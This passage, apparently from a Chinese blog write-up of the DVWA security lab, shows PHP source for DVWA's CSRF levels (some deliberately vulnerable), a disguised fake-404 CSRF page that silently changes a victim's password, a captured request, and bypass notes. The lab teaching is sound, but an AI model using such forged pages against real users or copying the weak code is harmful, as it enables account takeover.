class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># CSRF</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Impossible CSRF Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Check Anti-CSRF token</span></span><br><span class=\"line\">    checkToken( <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;user_token&#x27;</span> ], <span class=\"variable\">$_SESSION</span>[ <span class=\"string\">&#x27;session_token&#x27;</span> ], <span class=\"string\">&#x27;index.php&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$pass_curr</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password_current&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$pass_new</span>  = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password_new&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$pass_conf</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password_conf&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitise current password input</span></span><br><span class=\"line\">    <span class=\"variable\">$pass_curr</span> = stripslashes( <span class=\"variable\">$pass_curr</span> );</span><br><span class=\"line\">    <span class=\"variable\">$pass_curr</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$pass_curr</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">    <span class=\"variable\">$pass_curr</span> = md5( <span class=\"variable\">$pass_curr</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Check that the current password is correct</span></span><br><span class=\"line\">    <span class=\"variable\">$data</span> = <span class=\"variable\">$db</span>-&gt;prepare( <span class=\"string\">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class=\"line\">    <span class=\"variable\">$data</span>-&gt;bindParam( <span class=\"string\">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class=\"line\">    <span class=\"variable\">$data</span>-&gt;bindParam( <span class=\"string\">&#x27;:password&#x27;</span>, <span class=\"variable\">$pass_curr</span>, PDO::PARAM_STR );</span><br><span class=\"line\">    <span class=\"variable\">$data</span>-&gt;execute();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Do both new passwords match and does the current password match the user?</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( ( <span class=\"variable\">$pass_new</span> == <span class=\"variable\">$pass_conf</span> ) &amp;&amp; ( <span class=\"variable\">$data</span>-&gt;rowCount() == <span class=\"number\">1</span> ) ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// It does!</span></span><br><span class=\"line\">        <span class=\"variable\">$pass_new</span> = stripslashes( <span class=\"variable\">$pass_new</span> );</span><br><span class=\"line\">        <span class=\"variable\">$pass_new</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$pass_new</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">        <span class=\"variable\">$pass_new</span> = md5( <span class=\"variable\">$pass_new</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Update database with new password</span></span><br><span class=\"line\">        <span class=\"variable\">$data</span> = <span class=\"variable\">$db</span>-&gt;prepare( <span class=\"string\">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );</span><br><span class=\"line\">        <span class=\"variable\">$data</span>-&gt;bindParam( <span class=\"string\">&#x27;:password&#x27;</span>, <span class=\"variable\">$pass_new</span>, PDO::PARAM_STR );</span><br><span class=\"line\">        <span class=\"variable\">$data</span>-&gt;bindParam( <span class=\"string\">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class=\"line\">        <span class=\"variable\">$data</span>-&gt;execute();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Feedback for the user</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Issue with passwords matching</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Generate Anti-CSRF token</span></span><br><span class=\"line\">generateSessionToken();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># High CSRF Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Check Anti-CSRF token</span></span><br><span class=\"line\">    checkToken( <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;user_token&#x27;</span> ], <span class=\"variable\">$_SESSION</span>[ <span class=\"string\">&#x27;session_token&#x27;</span> ], <span class=\"string\">&#x27;index.php&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$pass_new</span>  = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password_new&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$pass_conf</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password_conf&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Do the passwords match?</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( <span class=\"variable\">$pass_new</span> == <span class=\"variable\">$pass_conf</span> ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// They do!</span></span><br><span class=\"line\">        <span class=\"variable\">$pass_new</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$pass_new</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">        <span class=\"variable\">$pass_new</span> = md5( <span class=\"variable\">$pass_new</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Update the database</span></span><br><span class=\"line\">        <span class=\"variable\">$insert</span> = <span class=\"string\">&quot;UPDATE `users` SET password = &#x27;<span class=\"subst\">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class=\"string\">&quot;&#x27;;&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$insert</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = mysqli_connect_error()) ? <span class=\"variable\">$___mysqli_res</span> : <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Feedback for the user</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Issue with passwords matching</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ((is_null(<span class=\"variable\">$___mysqli_res</span> = mysqli_close(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]))) ? <span class=\"literal\">false</span> : <span class=\"variable\">$___mysqli_res</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Generate Anti-CSRF token</span></span><br><span class=\"line\">generateSessionToken();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Medium CSRF Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Checks to see where the request came from</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( stripos( <span class=\"variable\">$_SERVER</span>[ <span class=\"string\">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class=\"variable\">$_SERVER</span>[ <span class=\"string\">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class=\"literal\">false</span> ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Get input</span></span><br><span class=\"line\">        <span class=\"variable\">$pass_new</span>  = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password_new&#x27;</span> ];</span><br><span class=\"line\">        <span class=\"variable\">$pass_conf</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password_conf&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Do the passwords match?</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>( <span class=\"variable\">$pass_new</span> == <span class=\"variable\">$pass_conf</span> ) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// They do!</span></span><br><span class=\"line\">            <span class=\"variable\">$pass_new</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$pass_new</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">            <span class=\"variable\">$pass_new</span> = md5( <span class=\"variable\">$pass_new</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// Update the database</span></span><br><span class=\"line\">            <span class=\"variable\">$insert</span> = <span class=\"string\">&quot;UPDATE `users` SET password = &#x27;<span class=\"subst\">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class=\"string\">&quot;&#x27;;&quot;</span>;</span><br><span class=\"line\">            <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$insert</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = mysqli_connect_error()) ? <span class=\"variable\">$___mysqli_res</span> : <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// Feedback for the user</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Issue with passwords matching</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Didn&#x27;t come from a trusted source</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ((is_null(<span class=\"variable\">$___mysqli_res</span> = mysqli_close(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]))) ? <span class=\"literal\">false</span> : <span class=\"variable\">$___mysqli_res</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Low CSRF Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$pass_new</span>  = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password_new&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$pass_conf</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password_conf&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Do the passwords match?</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( <span class=\"variable\">$pass_new</span> == <span class=\"variable\">$pass_conf</span> ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// They do!</span></span><br><span class=\"line\">        <span class=\"variable\">$pass_new</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$pass_new</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">        <span class=\"variable\">$pass_new</span> = md5( <span class=\"variable\">$pass_new</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Update the database</span></span><br><span class=\"line\">        <span class=\"variable\">$insert</span> = <span class=\"string\">&quot;UPDATE `users` SET password = &#x27;<span class=\"subst\">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class=\"string\">&quot;&#x27;;&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$insert</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = mysqli_connect_error()) ? <span class=\"variable\">$___mysqli_res</span> : <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Feedback for the user</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Issue with passwords matching</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ((is_null(<span class=\"variable\">$___mysqli_res</span> = mysqli_close(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]))) ? <span class=\"literal\">false</span> : <span class=\"variable\">$___mysqli_res</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"low-3\"><a class=\"markdownIt-Anchor\" href=\"#low-3\"></a> Low</h3>\n<ul>\n<li>做个网页</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>是兄弟就来砍我<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://192.168.23.133/dvwa/vulnerabilities/csrf/&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;get&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;password_new&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;123&quot;</span>/&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;password_conf&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;123&quot;</span>/&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;Change&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;Change&quot;</span>/&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;是兄弟就来砍我&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;font-size:40px;&quot;</span>&gt;</span>404<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;font-size:20px;&quot;</span>&gt;</span>Page not Found!<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>包信息</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change HTTP/1.1</span><br><span class=\"line\">Host: 192.168.23.133</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: en-US,en;q=0.5</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Referer: http://192.168.23.133/dvwa/vulnerabilities/csrf/</span><br><span class=\"line\">Cookie: security=medium; PHPSESSID=otpvh75rdm983qnfc0scstgns0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>\n<h3 id=\"medium-3\"><a class=\"markdownIt-Anchor\" href=\"#medium-3\"></a> Medium</h3>\n<ul>\n<li>Low方法失效，对比正常请求的包，发现包中添加了</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Referer: http://192.168.23.133/dvwa/vulnerabilities/csrf/</span><br></pre></td></tr></table></figure>\n<p>解决方案是将csrf网页部署在目标服务器IP作为的路径下。</p>\n<h3 id=\"high-3\"><a class=\"markdownIt-Anchor\" href=\"#high-3\"></a> High</h3>\n<ul>\n<li>需要配合XSS攻击</li>\n</ul>\n<h2 id=\"file-inclusion\"><a class=\"markdownIt-Anchor\" href=\"#file-inclusion\"></a> File Inclusion</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//File Inclusion</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Impossible File Inclusion Source</span></span><br><span class=\"line\"><span 